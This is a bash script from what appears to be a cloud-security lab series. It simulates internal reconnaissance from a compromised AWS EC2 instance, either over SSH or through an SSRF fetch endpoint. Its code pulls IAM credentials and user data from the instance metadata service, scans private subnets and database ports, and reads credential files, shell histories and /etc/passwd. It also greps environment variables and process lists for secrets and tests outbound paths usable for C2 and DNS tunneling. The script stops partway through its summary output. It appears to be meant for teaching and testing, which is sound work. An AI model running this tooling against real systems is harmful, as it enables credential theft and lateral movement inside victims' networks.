#!/usr/bin/env bash
# =============================================================================
# 09_internal_recon.sh — Internal recon: Lateral movement from compromised EC2
# =============================================================================
# Purpose:
#   After an attacker gains access to EC2 via SSH (or retrieves credentials via
#   SSRF+IMDS), simulate the reconnaissance activities executed from within EC2.
#
#   Demonstrate what an attacker can do if they obtain a shell on EC2:
#     1. Understand network configuration (ip addr, ip route, resolv.conf)
#     2. Direct retrieval of all IMDS data (direct access without SSRF)
#     3. Host discovery and port scanning within private subnet
#     4. Direct connection attempt to RDS
#     5. Reachability check to other private services
#     6. Collect secrets from local filesystem
#     7. Enumerate processes and services
#
# Execution method:
#   - Config A (Public): Log in directly to EC2 using SSH key
#   - Config B (Private): Retrieve command results via SSRF /fetch endpoint
#     Note: Config B cannot use direct SSH, so recon is limited to what SSRF allows
#
# Learning points:
#   - When EC2 is compromised, all resources in the 'Private Subnet' are threatened
#   - RDS is directly accessible from EC2 even though it's in a 'Private Subnet'
#   - Security groups often allow access from EC2
#   - EC2 locally contains secrets in user data, env vars, and config files
#
# Prerequisites:
#   - Config A: SSH key file must be available
#   - Config B: /fetch endpoint must be operational
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "09: Internal Recon — Lateral movement simulation from compromised EC2"

RESULT_FILE="09_internal_recon.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

# Test result counters
REACHABLE_HOSTS=0
EXPOSED_SECRETS=0
TOTAL_FINDINGS=0

record_finding() {
    local severity="$1"
    local msg="$2"
    ((TOTAL_FINDINGS++)) || true
    if [[ "${severity}" == "CRITICAL" || "${severity}" == "HIGH" ]]; then
        print_vulnerable "${msg}"
    else
        print_info "${msg}"
    fi
    result_text+="[${severity}] ${msg}"$'\n'
}

# ---------------------------------------------------------------------------
# Helper: Execute remote commands via SSH or SSRF
# ---------------------------------------------------------------------------
# Config A: Execute commands directly via SSH
# Config B: Only what's possible via SSRF (network info via IMDS)
# ---------------------------------------------------------------------------
SSH_AVAILABLE=false
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR"

run_on_ec2() {
    local cmd="$1"
    local timeout="${2:-15}"

    if [[ "${SSH_AVAILABLE}" == "true" ]]; then
        # Execute command via SSH
        ssh ${SSH_OPTS} -i "${SSH_KEY_FILE}" "ec2-user@${APP_PUBLIC_IP}" "${cmd}" 2>/dev/null
        return $?
    else
        # Cannot execute arbitrary commands via SSRF, return empty
        echo ""
        return 1
    fi
}

# Check SSH connectivity
echo -e "${BLUE}[*] Checking SSH connectivity...${NC}"
echo ""

if [[ "${CONFIG_MODE}" == "public" && -n "${APP_PUBLIC_IP}" && -f "${SSH_KEY_FILE}" ]]; then
    # SSH connection test
    ssh_test=$(ssh ${SSH_OPTS} -i "${SSH_KEY_FILE}" "ec2-user@${APP_PUBLIC_IP}" "echo SSH_OK" 2>/dev/null) || ssh_test=""

    if [[ "${ssh_test}" == "SSH_OK" ]]; then
        SSH_AVAILABLE=true
        echo -e "${RED}  SSH connection succeeded — Full shell control of EC2 established${NC}"
        record_finding "CRITICAL" "Established shell access to EC2 via SSH"
        result_text+="SSH connection: Succeeded (ec2-user@${APP_PUBLIC_IP})"$'\n'
    else
        echo -e "${YELLOW}  SSH connection failed — Switching to SSRF-based recon${NC}"
        result_text+="SSH connection: Failed"$'\n'
    fi
elif [[ "${CONFIG_MODE}" == "private" ]]; then
    echo -e "${GREEN}  Config B: EC2 has no Public IP, direct SSH connection is impossible${NC}"
    echo -e "${BLUE}  Will only recon information retrievable via SSRF/IMDS${NC}"
    result_text+="SSH connection: Impossible (Config B = Private Subnet)"$'\n'
else
    echo -e "${YELLOW}  SSH key file not found or Public IP unavailable${NC}"
    echo -e "${YELLOW}  SSH_KEY_FILE: ${SSH_KEY_FILE}${NC}"
    echo -e "${BLUE}  Switching to SSRF/IMDS-based recon${NC}"
    result_text+="SSH connection: No key file"$'\n'
fi

echo ""

# =============================================================================
# Step 1: Understand network configuration
# =============================================================================
print_header "Step 1: Understand Network Configuration"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 1: Network Configuration"$'\n'
result_text+="==============================="$'\n'

if [[ "${SSH_AVAILABLE}" == "true" ]]; then
    # --- 1a: IP addresses and interfaces ---
    echo -e "${BLUE}[*] 1a: Network interfaces and IP addresses${NC}"
    echo ""

    ip_addr=$(run_on_ec2 "ip addr show" 2>/dev/null) || ip_addr=""
    if [[ -n "${ip_addr}" ]]; then
        echo "${ip_addr}" | sed 's/^/    /'
        result_text+="--- ip addr ---"$'\n'
        result_text+="${ip_addr}"$'\n'
        record_finding "INFO" "Full network interface information retrieved"
    fi

    echo ""

    # --- 1b: Routing table ---
    echo -e "${BLUE}[*] 1b: Routing table — Verify traffic egress path${NC}"
    echo ""

    ip_route=$(run_on_ec2 "ip route show" 2>/dev/null) || ip_route=""
    if [[ -n "${ip_route}" ]]; then
        echo "${ip_route}" | sed 's/^/    /'
        result_text+="--- ip route ---"$'\n'
        result_text+="${ip_route}"$'\n'

        # Extract default gateway
        default_gw=$(echo "${ip_route}" | grep "^default" | awk '{print $3}')
        if [[ -n "${default_gw}" ]]; then
            echo ""
            echo -e "  Default gateway: ${default_gw}"
            echo -e "${YELLOW}    → External communication goes through this gateway${NC}"
        fi
    fi

    echo ""

    # --- 1c: DNS configuration ---
    echo -e "${BLUE}[*] 1c: DNS configuration — Check internal DNS resolver${NC}"
    echo ""

    resolv_conf=$(run_on_ec2 "cat /etc/resolv.conf" 2>/dev/null) || resolv_conf=""
    if [[ -n "${resolv_conf}" ]]; then
        echo "${resolv_conf}" | sed 's/^/    /'
        result_text+="--- /etc/resolv.conf ---"$'\n'
        result_text+="${resolv_conf}"$'\n'

        # VPC DNS (typically VPC CIDR + 2 = 10.0.0.2)
        dns_server=$(echo "${resolv_conf}" | grep "^nameserver" | awk '{print $2}' | head -1)
        if [[ -n "${dns_server}" ]]; then
            echo -e "  Internal DNS: ${dns_server}"
            echo -e "${YELLOW}    → VPC internal DNS resolver. Used for internal hostname resolution${NC}"
            record_finding "INFO" "VPC internal DNS resolver: ${dns_server}"
        fi
    fi

    echo ""

    # --- 1d: ARP table (other hosts in same subnet) ---
    echo -e "${BLUE}[*] 1d: ARP table — Hosts that have communicated within same subnet${NC}"
    echo ""

    arp_table=$(run_on_ec2 "ip neigh show" 2>/dev/null) || arp_table=""
    if [[ -n "${arp_table}" ]]; then
        echo "${arp_table}" | sed 's/^/    /'
        result_text+="--- ARP Table ---"$'\n'
        result_text+="${arp_table}"$'\n'
    else
        echo -e "    ARP table: Empty (no communication with other hosts)"
    fi

    echo ""

    # --- 1e: Listening ports ---
    echo -e "${BLUE}[*] 1e: Listening ports — Services running on EC2${NC}"
    echo ""

    listening=$(run_on_ec2 "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo 'Command unavailable'" 2>/dev/null) || listening=""
    if [[ -n "${listening}" ]]; then
        echo "${listening}" | sed 's/^/    /'
        result_text+="--- Listening Ports ---"$'\n'
        result_text+="${listening}"$'\n'
        record_finding "INFO" "EC2 listening port enumeration complete"
    fi

else
    # Retrieve network info via SSRF/IMDS
    echo -e "${BLUE}[*] Retrieving network info via SSRF/IMDS${NC}"
    echo ""

    # Private IP
    private_ip=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/local-ipv4" 2>/dev/null) || private_ip=""
    echo -e "  Private IP: ${private_ip}"
    result_text+="Private IP: ${private_ip}"$'\n'

    # MAC → VPC/Subnet info
    mac=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/mac" 2>/dev/null) || mac=""
    if [[ -n "${mac}" ]] && ! echo "${mac}" | grep -qi "404\|error"; then
        vpc_cidr=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/${mac}/vpc-ipv4-cidr-block" 2>/dev/null) || vpc_cidr=""
        subnet_cidr=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/${mac}/subnet-ipv4-cidr-block" 2>/dev/null) || subnet_cidr=""
        vpc_id=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/${mac}/vpc-id" 2>/dev/null) || vpc_id=""
        subnet_id=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/${mac}/subnet-id" 2>/dev/null) || subnet_id=""

        echo -e "  VPC ID:      ${vpc_id}"
        echo -e "  VPC CIDR:    ${vpc_cidr}"
        echo -e "  Subnet ID:   ${subnet_id}"
        echo -e "  Subnet CIDR: ${subnet_cidr}"
        result_text+="VPC: ${vpc_id} (${vpc_cidr}), Subnet: ${subnet_id} (${subnet_cidr})"$'\n'
        record_finding "HIGH" "VPC/Subnet info retrieved via IMDS — Internal network structure revealed"
    fi
fi

echo ""

# =============================================================================
# Step 2: Full IMDS metadata collection (direct access)
# =============================================================================
print_header "Step 2: Full IMDS Metadata Collection"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 2: IMDS Metadata"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Access IMDS directly from within EC2 to collect all metadata${NC}"
echo -e "${BLUE}    Via SSH: Execute curl http://169.254.169.254/... directly${NC}"
echo -e "${BLUE}    Via SSRF: Retrieve via /fetch?url=http://169.254.169.254/...${NC}"
echo ""

# IMDS retrieval function (via SSH or SSRF)
fetch_imds() {
    local path="$1"
    if [[ "${SSH_AVAILABLE}" == "true" ]]; then
        run_on_ec2 "curl -sS -m 3 '${IMDS_BASE}/${path}'" 2>/dev/null
    else
        curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/${path}" 2>/dev/null
    fi
}

# --- 2a: User data (most dangerous — often contains secrets) ---
echo -e "${RED}[*] 2a: User data — Full contents of startup script${NC}"
echo ""

userdata=$(fetch_imds "latest/user-data") || userdata=""

if [[ -n "${userdata}" ]] && ! echo "${userdata}" | grep -qi "404\|not found"; then
    echo -e "${RED}  User data contents:${NC}"
    echo "${userdata}" | head -50 | sed 's/^/    /'
    result_text+="--- User Data ---"$'\n'
    result_text+="${userdata}"$'\n'
    record_finding "HIGH" "Full contents of user data (startup script) retrieved"

    # Secret scan
    echo ""
    echo -e "${BLUE}  Secret scan:${NC}"
    secret_patterns=(
        "password"
        "secret"
        "api[_-]?key"
        "token"
        "credentials"
        "DB_PASS"
        "AWS_ACCESS"
        "PRIVATE[_-]?KEY"
        "BEGIN RSA"
        "psql.*-W\|PGPASSWORD"
    )

    for pattern in "${secret_patterns[@]}"; do
        matches=$(echo "${userdata}" | grep -iE "${pattern}" 2>/dev/null || true)
        if [[ -n "${matches}" ]]; then
            echo -e "${RED}    Pattern '${pattern}' matched:${NC}"
            echo "${matches}" | head -3 | sed 's/^/      /'
            ((EXPOSED_SECRETS++)) || true
        fi
    done

    if [[ "${EXPOSED_SECRETS}" -gt 0 ]]; then
        record_finding "CRITICAL" "${EXPOSED_SECRETS} secret patterns detected in user data"
    fi
else
    echo -e "  User data: Could not retrieve"
    result_text+="User data: None"$'\n'
fi

echo ""

# --- 2b: IAM credentials (directly accessible via curl from SSH) ---
echo -e "${BLUE}[*] 2b: Direct IAM credential retrieval${NC}"
echo ""

iam_role=$(fetch_imds "latest/meta-data/iam/security-credentials/") || iam_role=""

if [[ -n "${iam_role}" ]] && ! echo "${iam_role}" | grep -qi "404\|error"; then
    echo -e "${RED}  IAM role: ${iam_role}${NC}"
    iam_creds=$(fetch_imds "latest/meta-data/iam/security-credentials/${iam_role}") || iam_creds=""
    if echo "${iam_creds}" | grep -qi "AccessKeyId"; then
        echo -e "${RED}  IAM credentials retrieved successfully (see 07_full_kill_chain for details)${NC}"
        access_key=$(echo "${iam_creds}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('AccessKeyId',''))" 2>/dev/null || echo "")
        echo -e "  AccessKeyId: ${access_key}"
        result_text+="IAM credentials: Retrieved successfully (AccessKeyId: ${access_key})"$'\n'
        record_finding "CRITICAL" "IAM credentials retrieved directly"
    fi
else
    echo -e "  IAM role: Not found"
    result_text+="IAM role: None"$'\n'
fi

echo ""

# --- 2c: Instance identity document ---
echo -e "${BLUE}[*] 2c: Instance Identity Document${NC}"
echo ""

identity_doc=$(fetch_imds "latest/dynamic/instance-identity/document") || identity_doc=""
if [[ -n "${identity_doc}" ]] && ! echo "${identity_doc}" | grep -qi "404\|error"; then
    echo "${identity_doc}" | python3 -m json.tool 2>/dev/null | sed 's/^/    /' || echo "    ${identity_doc}"
    result_text+="--- Instance Identity Document ---"$'\n'
    result_text+="${identity_doc}"$'\n'
    record_finding "HIGH" "Instance identity document (account ID, region, AMI, etc.) retrieved"
fi

echo ""

# =============================================================================
# Step 3: Private subnet scanning
# =============================================================================
print_header "Step 3: Private Subnet Exploration"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 3: Private Subnet Exploration"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Explore hosts in internal network visible from EC2${NC}"
echo -e "${BLUE}    Check if resources like RDS in Private Subnet are reachable${NC}"
echo ""

# RDS endpoint resolution and connection attempt
if [[ -n "${RDS_ENDPOINT}" ]]; then
    rds_host=$(parse_rds_host)
    rds_port=$(parse_rds_port)

    echo -e "${BLUE}[*] 3a: RDS endpoint connection attempt${NC}"
    echo -e "  RDS endpoint: ${rds_host}:${rds_port}"
    echo ""

    if [[ "${SSH_AVAILABLE}" == "true" ]]; then
        # DNS resolution of RDS via SSH
        rds_ip=$(run_on_ec2 "dig +short ${rds_host} 2>/dev/null || nslookup ${rds_host} 2>/dev/null | grep -A1 'Name:' | grep 'Address:' | awk '{print \$2}' || echo 'DNS resolution failed'" 2>/dev/null) || rds_ip=""
        echo -e "  RDS Private IP: ${rds_ip}"
        result_text+="RDS IP: ${rds_ip}"$'\n'

        # TCP connection attempt
        rds_connect=$(run_on_ec2 "timeout 5 bash -c 'echo > /dev/tcp/${rds_host}/${rds_port}' 2>&1 && echo 'OPEN' || echo 'CLOSED'" 2>/dev/null) || rds_connect="FAILED"

        if echo "${rds_connect}" | grep -q "OPEN"; then
            ((REACHABLE_HOSTS++)) || true
            record_finding "CRITICAL" "TCP connection to RDS (${rds_host}:${rds_port}) from EC2 succeeded"
            echo -e "${YELLOW}    → When EC2 is compromised, RDS in Private Subnet is directly accessible${NC}"
            echo -e "${YELLOW}    → Because security group allows PostgreSQL connections from EC2${NC}"

            # PostgreSQL connection attempt (if psql client is available)
            psql_test=$(run_on_ec2 "which psql >/dev/null 2>&1 && PGPASSWORD='wrongpassword' psql -h '${rds_host}' -p '${rds_port}' -U admin -d postgres -w -c 'SELECT 1;' 2>&1 || echo 'psql not installed or auth failed'" 2>/dev/null) || psql_test=""

            if echo "${psql_test}" | grep -qi "password authentication failed\|no pg_hba.conf entry"; then
                echo -e "${RED}    Reached PostgreSQL auth phase — DB access possible with password${NC}"
                record_finding "HIGH" "RDS PostgreSQL: Reached auth phase (connection itself established)"
            elif echo "${psql_test}" | grep -qi "psql not installed"; then
                echo -e "    psql client not installed (TCP connection succeeded)"
            fi
        else
            echo -e "${GREEN}  TCP connection to RDS: Failed${NC}"
            result_text+="RDS TCP connection: Failed"$'\n'
        fi
    else
        # Check RDS reachability via SSRF
        echo -e "${BLUE}  Attempting RDS port access via SSRF${NC}"
        # /fetch only supports HTTP requests, so direct PostgreSQL port connection is not possible
        # However, DNS resolution of RDS can be verified via SSRF
        rds_ssrf=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=http://${rds_host}:${rds_port}/" 2>/dev/null) || rds_ssrf=""
        if [[ -n "${rds_ssrf}" ]]; then
            echo -e "  SSRF-based RDS access result: ${rds_ssrf:0:200}"
            # PostgreSQL protocol may be returned as HTTP response
            if echo "${rds_ssrf}" | grep -qi "postgresql\|Protocol"; then
                ((REACHABLE_HOSTS++)) || true
                record_finding "CRITICAL" "PostgreSQL protocol response verified via SSRF to RDS"
            fi
        fi
        result_text+="RDS SSRF: ${rds_ssrf:0:200}"$'\n'
    fi
else
    echo -e "${YELLOW}  RDS endpoint is not configured${NC}"
fi

echo ""

# --- 3b: Host discovery within subnet ---
echo -e "${BLUE}[*] 3b: Host discovery within subnet (ping sweep)${NC}"
echo ""

if [[ "${SSH_AVAILABLE}" == "true" ]]; then
    # Estimate subnet from EC2's Private IP
    ec2_private_ip=$(run_on_ec2 "curl -s ${IMDS_BASE}/latest/meta-data/local-ipv4" 2>/dev/null) || ec2_private_ip=""

    if [[ -n "${ec2_private_ip}" ]]; then
        # Extract the first 3 octets of the subnet
        subnet_prefix=$(echo "${ec2_private_ip}" | cut -d. -f1-3)
        echo -e "  EC2 Private IP: ${ec2_private_ip}"
        echo -e "  Target scan subnet: ${subnet_prefix}.0/24"
        echo ""

        # Scan major subnet ranges
        # VPC CIDR = 10.0.0.0/16, so the following subnets exist
        SCAN_SUBNETS=(
            "10.0.1"    # public-1
            "10.0.3"    # public-2
            "10.0.10"   # app-1
            "10.0.11"   # app-2
            "10.0.20"   # db-1
            "10.0.21"   # db-2
        )

        result_text+="--- Subnet Scan ---"$'\n'

        for subnet in "${SCAN_SUBNETS[@]}"; do
            echo -e "  Scan: ${subnet}.0/24"

            # Ping each subnet's gateway (.1) and common hosts (.1-.10)
            # Efficient scanning with short timeouts
            scan_result=$(run_on_ec2 "
                for i in 1 2 3 4 5 6 7 8 9 10 50 100 200; do
                    timeout 1 ping -c 1 -W 1 ${subnet}.\${i} >/dev/null 2>&1 && echo \"${subnet}.\${i} ALIVE\"
                done
            " 2>/dev/null) || scan_result=""

            if [[ -n "${scan_result}" ]]; then
                echo "${scan_result}" | sed 's/^/      /'
                result_text+="${scan_result}"$'\n'
                alive_count=$(echo "${scan_result}" | grep -c "ALIVE" || echo 0)
                if [[ "${alive_count}" -gt 0 ]]; then
                    ((REACHABLE_HOSTS += alive_count)) || true
                fi
            else
                echo -e "      No response"
            fi
        done

        echo ""

        # --- 3c: Port scan discovered hosts ---
        echo -e "${BLUE}[*] 3c: Port scan discovered hosts${NC}"
        echo ""

        # RDS endpoint IP
        if [[ -n "${rds_ip:-}" ]]; then
            echo -e "  RDS (${rds_ip}) port scan:"
            port_scan=$(run_on_ec2 "
                for port in 5432 1433 6379 27017 11211; do
                    timeout 2 bash -c \"echo > /dev/tcp/${rds_ip}/\${port}\" 2>/dev/null && echo \"  \${port}/tcp OPEN\" || echo \"  \${port}/tcp closed\"
                done
            " 2>/dev/null) || port_scan=""

            if [[ -n "${port_scan}" ]]; then
                echo "${port_scan}" | sed 's/^/      /'
                result_text+="RDS Port scan: ${port_scan}"$'\n'
            fi
        fi

        # VPC DNS server (10.0.0.2) access check
        echo ""
        echo -e "  VPC DNS (10.0.0.2) access check:"
        dns_test=$(run_on_ec2 "timeout 2 bash -c 'echo > /dev/tcp/10.0.0.2/53' 2>&1 && echo 'OPEN' || echo 'CLOSED'" 2>/dev/null) || dns_test=""
        echo -e "      53/tcp: ${dns_test}"
        result_text+="VPC DNS 53/tcp: ${dns_test}"$'\n'
    fi
else
    echo -e "${YELLOW}  SSH connection unavailable, skipping subnet scan${NC}"
    echo -e "${YELLOW}  Arbitrary TCP port scanning is difficult via SSRF${NC}"
    result_text+="Subnet scan: Skipped (SSH unavailable)"$'\n'

    # However, HTTP access to internal hosts can be attempted via SSRF
    echo ""
    echo -e "${BLUE}[*] Attempting HTTP access to internal hosts via SSRF${NC}"

    # HTTP access to common internal service ports
    INTERNAL_TARGETS=(
        "http://10.0.1.1/"
        "http://10.0.10.1/"
        "http://10.0.20.1/"
        "http://169.254.169.254/latest/meta-data/"
    )

    for target in "${INTERNAL_TARGETS[@]}"; do
        resp=$(curl -sS -m 5 -o /dev/null -w "%{http_code}" "${TARGET_URL}/fetch?url=${target}" 2>/dev/null) || resp="000"
        echo -e "  ${target} → HTTP ${resp}"
        result_text+="SSRF ${target}: HTTP ${resp}"$'\n'
        if [[ "${resp}" != "000" && "${resp}" != "500" ]]; then
            ((REACHABLE_HOSTS++)) || true
        fi
    done
fi

echo ""

# =============================================================================
# Step 4: Collect secrets from local filesystem
# =============================================================================
print_header "Step 4: Local Filesystem Secret Collection"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 4: Local Secrets"$'\n'
result_text+="==============================="$'\n'

if [[ "${SSH_AVAILABLE}" == "true" ]]; then
    echo -e "${BLUE}[*] Attacker searches for secrets in EC2's filesystem${NC}"
    echo ""

    # --- 4a: Environment variables ---
    echo -e "${BLUE}[*] 4a: Environment variables (running processes often contain secrets in env vars)${NC}"
    echo ""

    env_vars=$(run_on_ec2 "env 2>/dev/null | grep -iE 'PASSWORD|SECRET|KEY|TOKEN|DB_|AWS_|API_|CREDENTIAL' || echo 'No secret patterns'" 2>/dev/null) || env_vars=""
    if [[ -n "${env_vars}" && "${env_vars}" != "No secret patterns" ]]; then
        echo -e "${RED}  Env vars containing secrets:${NC}"
        echo "${env_vars}" | sed 's/=.*/=***/' | sed 's/^/    /'  # Mask values
        ((EXPOSED_SECRETS++)) || true
        record_finding "HIGH" "Secret patterns detected in environment variables"
        result_text+="Env var secrets: Detected"$'\n'
    else
        echo -e "  Environment variables with secret patterns: None"
        result_text+="Env var secrets: None"$'\n'
    fi

    echo ""

    # --- 4b: Configuration file discovery ---
    echo -e "${BLUE}[*] 4b: Configuration file discovery${NC}"
    echo ""

    CONFIG_PATHS=(
        "/opt/app.py"
        "/etc/environment"
        "/etc/profile.d/*.sh"
        "/home/ec2-user/.bash_history"
        "/home/ec2-user/.aws/credentials"
        "/home/ec2-user/.aws/config"
        "/home/ec2-user/.ssh/authorized_keys"
        "/root/.bash_history"
        "/var/log/cloud-init.log"
        "/var/log/cloud-init-output.log"
        "/var/lib/cloud/instance/user-data.txt"
    )

    result_text+="--- Config File Discovery ---"$'\n'
    for fpath in "${CONFIG_PATHS[@]}"; do
        file_content=$(run_on_ec2 "cat '${fpath}' 2>/dev/null | head -30 || echo '__NOT_FOUND__'" 2>/dev/null) || file_content="__NOT_FOUND__"

        if [[ "${file_content}" != "__NOT_FOUND__" && -n "${file_content}" ]]; then
            echo -e "${RED}  ${fpath}:${NC}"
            echo "${file_content}" | head -15 | sed 's/^/      /'

            # Truncated for long files
            line_count=$(echo "${file_content}" | wc -l | tr -d ' ')
            if [[ "${line_count}" -gt 15 ]]; then
                echo -e "      ... (${line_count} lines, showing first 15 only)"
            fi

            result_text+="${fpath}: Read succeeded (${line_count} lines)"$'\n'

            # Secret scan
            if echo "${file_content}" | grep -qiE "password|secret|key|token|api[_-]?key"; then
                ((EXPOSED_SECRETS++)) || true
                record_finding "HIGH" "Secret patterns detected in ${fpath}"
            fi
        else
            echo -e "  ${fpath}: Does not exist or access denied"
        fi
        echo ""
    done

    # --- 4c: cloud-init log (startup debug info often leaks secrets) ---
    echo -e "${BLUE}[*] 4c: cloud-init log check${NC}"
    echo ""

    cloudinit_log=$(run_on_ec2 "grep -iE 'password|secret|key|token|credential' /var/log/cloud-init-output.log 2>/dev/null | head -10 || echo 'No patterns'" 2>/dev/null) || cloudinit_log=""
    if [[ -n "${cloudinit_log}" && "${cloudinit_log}" != "No patterns" ]]; then
        echo -e "${RED}  Secret patterns in cloud-init log:${NC}"
        echo "${cloudinit_log}" | head -10 | sed 's/^/    /'
        ((EXPOSED_SECRETS++)) || true
        record_finding "HIGH" "Secret patterns detected in cloud-init log"
        result_text+="cloud-init secrets: Detected"$'\n'
    else
        echo -e "  cloud-init log: No secret patterns"
        result_text+="cloud-init secrets: None"$'\n'
    fi

    echo ""

    # --- 4d: Running processes ---
    echo -e "${BLUE}[*] 4d: Running processes (command lines may contain secrets)${NC}"
    echo ""

    processes=$(run_on_ec2 "ps auxww 2>/dev/null" 2>/dev/null) || processes=""
    if [[ -n "${processes}" ]]; then
        echo -e "  Running processes:"
        echo "${processes}" | head -20 | sed 's/^/    /'
        result_text+="--- Process List ---"$'\n'
        result_text+="${processes}"$'\n'

        # Check for secrets in process command lines
        secret_procs=$(echo "${processes}" | grep -iE "password|secret|key|token" || true)
        if [[ -n "${secret_procs}" ]]; then
            echo ""
            echo -e "${RED}  Processes containing secrets:${NC}"
            echo "${secret_procs}" | sed 's/^/    /'
            ((EXPOSED_SECRETS++)) || true
            record_finding "HIGH" "Secrets detected in process command lines"
        fi
    fi

else
    echo -e "${YELLOW}  SSH connection unavailable, skipping local filesystem exploration${NC}"
    echo ""
    echo -e "${BLUE}  Local info retrievable via SSRF:${NC}"

    # user-data was already retrieved in Step 2
    # /fetch cannot read files (HTTP requests only)
    echo -e "    - User data: Already retrieved in Step 2"
    echo -e "    - IMDS metadata: Already retrieved in Step 2"
    echo -e "    - Local files: Cannot retrieve via SSRF (HTTP protocol only)"
    echo -e "    - However, if the app supports file:// scheme, local file read is possible"

    # file:// scheme attempt
    echo ""
    echo -e "${BLUE}  Attempting local file read via file:// scheme:${NC}"
    file_test=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=file:///etc/passwd" 2>/dev/null) || file_test=""
    if [[ -n "${file_test}" ]] && echo "${file_test}" | grep -q "root:"; then
        echo -e "${RED}    Successfully read /etc/passwd:${NC}"
        echo "${file_test}" | head -10 | sed 's/^/      /'
        record_finding "CRITICAL" "file:// scheme usable via SSRF — Local file read is possible"
    else
        echo -e "${GREEN}    file:// scheme: Blocked (Python requests library rejects file://)${NC}"
        result_text+="file:// scheme: Blocked"$'\n'
    fi
fi

echo ""

# =============================================================================
# Step 5: External communication path check (C2 server connectivity)
# =============================================================================
print_header "Step 5: External Communication Path — Can C2 communication be established"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 5: External Communication Path"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Attacker checks if EC2 can communicate with external Command & Control server${NC}"
echo ""

if [[ "${SSH_AVAILABLE}" == "true" ]]; then
    # Check external communication over multiple protocols/ports
    echo -e "${BLUE}[*] 5a: HTTPS outbound communication${NC}"
    https_test=$(run_on_ec2 "curl -sS -m 5 https://checkip.amazonaws.com 2>/dev/null || echo 'FAILED'" 2>/dev/null) || https_test="FAILED"
    if echo "${https_test}" | grep -qE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'; then
        echo -e "${RED}    HTTPS outbound: Allowed (IP: ${https_test})${NC}"
        record_finding "HIGH" "HTTPS outbound from EC2 is possible — Can be abused for C2 communication"
    else
        echo -e "${GREEN}    HTTPS outbound: Blocked${NC}"
    fi

    echo -e "${BLUE}[*] 5b: DNS external communication${NC}"
    dns_test=$(run_on_ec2 "dig +short example.com 2>/dev/null || nslookup example.com 2>/dev/null | grep Address | tail -1 || echo 'FAILED'" 2>/dev/null) || dns_test=""
    if [[ -n "${dns_test}" && "${dns_test}" != "FAILED" ]]; then
        echo -e "${RED}    DNS resolution: Succeeded — Data exfiltration via DNS tunneling is possible${NC}"
        record_finding "HIGH" "External DNS resolution from EC2 is possible — Can be abused for DNS tunneling"
    else
        echo -e "${GREEN}    DNS resolution: Blocked${NC}"
    fi

    echo -e "${BLUE}[*] 5c: ICMP outbound${NC}"
    icmp_test=$(run_on_ec2 "ping -c 1 -W 3 8.8.8.8 2>/dev/null && echo 'OPEN' || echo 'BLOCKED'" 2>/dev/null) || icmp_test=""
    if echo "${icmp_test}" | grep -q "OPEN"; then
        echo -e "${YELLOW}    ICMP outbound: Allowed — Can be abused for ICMP tunneling${NC}"
        record_finding "MEDIUM" "ICMP outbound communication from EC2 is possible"
    else
        echo -e "${GREEN}    ICMP outbound: Blocked${NC}"
    fi

    result_text+="HTTPS: ${https_test}"$'\n'
    result_text+="DNS: ${dns_test}"$'\n'
    result_text+="ICMP: ${icmp_test}"$'\n'
else
    # Check outbound via SSRF
    echo -e "${BLUE}  Checking outbound communication via SSRF:${NC}"
    outbound_ip=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=https://checkip.amazonaws.com" 2>/dev/null) || outbound_ip=""
    if echo "${outbound_ip}" | grep -qE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'; then
        echo -e "${RED}    Outbound IP: ${outbound_ip}${NC}"
        record_finding "HIGH" "Outbound communication from EC2 to Internet is possible"
    else
        echo -e "    Outbound check: Failed"
    fi
    result_text+="SSRF outbound: ${outbound_ip}"$'\n'
fi

echo ""

# =============================================================================
# Internal Recon Result Summary
# =============================================================================
print_header "Internal Recon Result Summary"

result_text+=$'\n'"==============================="$'\n'
result_text+="Summary"$'\n'
result_text+="==============================="$'\n'

echo -e "${BOLD}╔═══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}║                    Internal Recon Result Summary                  ║${NC}"
echo -e "${BOLD}╠═══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}║  Config:             ${CONFIG_LABEL}${NC}"
echo -e "${BOLD}║  Recon method:       $([ "${SSH_AVAILABLE}" == "true" ] && echo "SSH direct access" || echo "Via SSRF/IMDS")${NC}"
echo -e "${BOLD}║  Findings:           ${TOTAL_FINDINGS} items${NC}"
echo -e "${BOLD}║  Reachable hosts:    ${REACHABLE_HOSTS} items${NC}"
echo -e "${BOLD}║  Exposed secrets:    ${EXPOSED_SECRETS} items${NC}"
echo -e "${BOLD}╠═══════════════════════════════════════════════════════════════════╣${NC}"

result_text+="Recon method: $([ "${SSH_AVAILABLE}" == "true" ] && echo "SSH" || echo "SSRF")"$'\n'
result_text+="Findings: ${TOTAL_FINDINGS}"$'\n'
